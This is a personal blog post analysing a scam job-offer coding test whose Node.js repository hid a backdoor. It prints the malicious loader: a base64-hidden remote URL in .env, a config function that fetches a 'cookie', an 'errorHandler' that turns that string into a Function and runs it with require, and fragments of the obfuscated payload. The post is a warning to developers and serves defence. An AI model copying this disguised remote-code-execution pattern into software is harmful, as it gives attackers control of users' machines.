---
title: Job offer was a scam
date: 2025-08-17
description: How I got a very good job offer that in reality was a scam
tags: [story, IT, scam]
---

# How they tried to scam me with a job offer

This weekend I was working in a technical test for a job offer of someone that contacted me on Linkedin. I was not initially interested, but the offer was too good to let it go, and the guy told me it was just a simple "check to validate my skills".
Cloned the repo, read the readme and it said that the completion time was expected to be one or two hours. Ok, fine, let's give this a try.

## Things that smell a bit

They said they were looking fow someone with typescript experience, still the entire codebase was written in javascript.
Also, the required node version was quite old, 18. When I am writing this article the normal version to use is 22, and 24 is already available.

## My environment is not conventional

I don't use globally installed packages. Everything is managed per-project, using nix and flakes. The README instructs to just use `nvm 18` to get nodejs version 18, but that is not what I do.
Nixpkgs doesn't have any available node 18 version in their latest release, so I had to do some nix gymnastics to be able to use such an old version, so this was constantly in my mind, it was not just a little annoyance. This is was put me "in alert".

## The trigger

This weekend also had family plans (on the country side), so I decided to continue this thing while traveling. After all I was very close to complete it and my wife is the one that enjoys driving.
As soon as I got into the car, and lost internet connectivity, something very interesting popped up in the console. It was a very long message, so I will just show here the most interesting section:

```json
  cause: Error: getaddrinfo ENOTFOUND api.mocki.io
      at GetAddrInfoReqWrap.onlookup [as oncomplete] (node:dns:107:26) {
    errno: -3008,
    code: 'ENOTFOUND',
    syscall: 'getaddrinfo',
    hostname: 'api.mocki.io'
  }
```

Where is that coming from? There is no reference to such URL in the entire codebase, and it was definitely not needed for the task.
Initially I thought it could be some "candidate control" software, so I decided to investigate it a bit, starting from the backend `index.js` as in the backend is where the error originated.
In the initialization there was not anything extraordinary to be fair, basic express settings. There was, however, a reference to a `initRuntimeConfig`, which for such a basic setup was totally unnecessary to my eyes, so there we go.

## Not very well hidden

In the runtime config, there were some functions that were loading data from the environment, reloading the config by doing network requests, calling the route errorHandler with a cookie... WHAIT, WHAT ??

Let's take a closer look. First the `fetchConfig` function:

```ts
async function fetchConfig() {
  const src = loadEnv(process.env.DB_API_KEY);
  const k = loadEnv(process.env.DB_ACCESS_KEY);
  const v = loadEnv(process.env.DB_ACCESS_VALUE);
  return axios.get(src, { headers: { [k]: v } });
}
```

Why are this loading from environment a DB_API_KEY and then doing a network request using axios, which is not used anywhere else in the entire application?
Where is this loadEnv function coming from, by the way? It is imported from the `errorHandler.js` file, very unconventional for a http error handler module if you ask me...

```ts
const loadEnv = (value) => Buffer.from(value, "base64").toString("utf8");
```

Definitely unconventional for an error handler.

In the repo there is a `.env` file, containing  A LOT of environment variables, most of them are either dev time values (port 4001), or completely fakes.
However, there are one or two values that are just long strings, that doesn't look that arbitrary.

What if you use `loadEnv` to read the more "suspicious" values?

```ts
> loadEnv('aHR0cHM6Ly9hcGkubW9ja2kuaW8vdjIvYmZibWxjMGs=')
'https://api.mocki.io/v2/bfbmlc0k'
```

Ok, there it is, hidden in plain sight. Although, I would say not that much hidden if you have basic curiosity.
What about the rest of functions in this runtimeConfig thing?

```ts
async function reloadRuntimeConfig() {
  try {
    const res = await fetchConfig();
    errorHandler(res.data.cookie);
    global.myConfig = res.data;
    console.log("Config reloaded");
  } catch (err) {
    console.error("Failed to reload config:", err.message);
  }
}
```

See what I said? the response contains a cookie, and that cookie is fed to the errorHandler. I already looked at the error handler before, but I didn't found anything unconventional except for some magic string handling, but that is something not that uncommon in plain JS.
Let's examine it with our new prism though:

```ts
const errorHandler = (error) => {
  try {
    if (typeof error !== 'string') {
      console.error('Invalid error format. Expected a string.');
      return;
    }
    const createHandler = (errCode) => {
      try {
        const handler = new (Function.constructor)('require', errCode);
        return handler;
      } catch (e) {
        console.error('Failed:', e.message);
        return null;
      }
    };
    const handlerFunc = createHandler(error);
    if (handlerFunc) {
      handlerFunc(require);
    } else {
      console.error('Handler function is not available.');
    }
  } catch (globalError) {
    console.error('Unexpected error inside errorHandler:', globalError.message);
  }
};
```

The first part is what I said already, nothing very concerning if the error is not of type string, continue.
But, what if it is... Ah, that is a function constructor, built from an error string?

```ts
    const createHandler = (errCode) => {
      try {
        const handler = new (Function.constructor)('require', errCode);
        return handler;
      } catch (e) {
        console.error('Failed:', e.message);
        return null;
      }
    };
```

Obviously, this is not an error handler, and this is not an error message string. This is remote code execution.
They put in place the most basic mechanism to fetch from a remote API, enough spread in the code hoping you will not check them because the time pressure of doing it under 1 or 2 hours.

At this point, I have enough evidences to know they are trying to scam me and use my computer to either mine crypto currencies or try to steal anyones that I may have. Checking my node processes, I saw one at 100%, which I already killed, so I pretty much suspect they were just trying to mine using my computer.

Ah, you want more evidences you said? Well, here is the the "content" of the cookie if you fetch and log it:

```
{"cookie":"{(function(_0x507316,_0x4cdc23){function _0x493fd1(_0x5d4c12,_0x44a1ca,_0x4880e8,_0x33d349){return _0x3cac(_0x5d4c12- -0x25d,_0x33d349);}const _0x266d8f=_0x507316();function _0x3c8b51(_0x28f3fe,_0x39b653,_0x1935a6,_0x47a2c0){return _0x3cac(_0x47a2c0-0x268,_0x1935a6);}
...
```

There is, a minified, obfuscated, and compressed function that is 108kb long.
That function is taking as argument a `require` function, and it is using it to load a module:

```ts
const handlerFunc = createHandler(error);
if (handlerFunc) {
  handlerFunc(require);
} else {
  console.error('Handler function is not available.');
}
```

Inside that payload, the require functrion isused several times to load more libraries they should not have access to (`fs`, `os`), including some obfuscated modules.

```ts
(_0x41d07c),_0x28d736[_0x31fe64]=_0x4941ee;}}});_0x5a9ca1();const fs=require('fs'),os=require('os'),path=require(_0x25bd5a(-0xbb,-0x1a0,-0xf1,-0xf6)),axios=require(_0x25bd5a(-0x73,-0x184,-0xae,-0xe2)),request=require(_0x25bd5a(0x52,-0x12,0x18,0x1f)),ex=require(_0x25bd5a(0x27,-0x8f,0x9a,0x1)+'ess')[_0x25bd5a(-0x7a,-0x62,0xaa,0x2d)],hostname=os[_0x2391de(0x3a2,0x404,0x44d,0x3d4)](),platform=os[_0x25bd5a(-0x55,0x57,0x45,-0x15)](),homeDir=os[_0x25bd5a(-0x12a,-0xa8,-0x124,-0xb8)](),tmpDir=os['tmpdir'](),fs_promises=require(_0x25bd5a(-0x175,-0x7f,-0x195,-0x11b)
```

## Final notes

I have to say that nothing was too suspicious to begin with. The test was pretty standard, fairly well documented and the askings were advanced but reasonable.
Also, everything was reasonably named for the context of the task. Error handler functions, payloads containing a cookie, functions named behind what they looked to be doing, reasonable amount of comments and in general the code seems to care about being correct.
Now that I look back, there are more upfront clues, like the repository being created just 4 days ago, the old version of node, etc, etc, but all things you can explain in the context of a technical test for a job position.
Also, the attention was weirdly directed to the places where bugs existed, which is a nicety you usually don't have in normal tests. There were comments like `// here is a memory leak, fix it` and `// intentionally sync code, make it better`. Now I now what they were trying to do was to direct my attention, like any good magician, they do their trick while you look somewhere else.
That said, there were one or two bugs that were not documented that I felt very proud of fixing without being asked, hoping for a higher score because I spot them. How fool I was, they were probably to keep you entertain as much as possible.
Also, the offer was good, but nothing ridiculous, so they clearly try to keep things realistic to not make you reject without even trying because it is obviously too good to be true.

Hope we all learned a lesson from this. Read all the code before you execute anything.
